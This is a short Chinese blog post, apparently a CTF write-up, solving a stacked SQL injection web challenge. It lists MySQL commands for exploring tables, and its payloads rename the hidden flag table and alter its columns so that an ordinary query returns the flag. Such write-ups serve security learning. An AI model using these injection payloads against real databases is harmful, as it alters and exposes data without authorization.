---
title: BuuWeb1
date: 2020-10-28 11:02:50
cover: https://img.buuoj.cn/buugirl/img.php
tags:
	- CTF
	- WEB
categories:
	- CTF解题
	- Web安全
---



# 强网杯随便注

[截屏2020-10-28 上午11.24.27]

这题显然是存在sql注入点的。主要考点是**堆叠注入**。然而堆叠注入本身的意思就只是能连续执行sql语句而已。

以下记录一些解题过程中用到的东西。

desc [表名]可以查看表结构 (数字开头的表名需要加反引号)

show columns from [表名] （常用show databases，show tables，第一次见这个）

rename tables [表名1] to [表名2] 修改表名



## 爆表

[截屏2020-11-09 下午5.21.37]

## desc查看表结构

1919810931114514表结构

[截屏2020-11-09 下午5.25.06]

words表结构

[截屏2020-11-09 下午5.27.35]

由于没有select可以用，所以用个神奇的操作，把flag所在表的名字改成words，并在flag所在表中增加一个字段id。

payload：

```mysql
1’;rename table words to n0p3;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#
```

```mysql
1‘;rename tables `words` to `n0p3`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);
```

然后 1' or 1=1;#读flag

[截屏2020-10-28 上午11.17.14]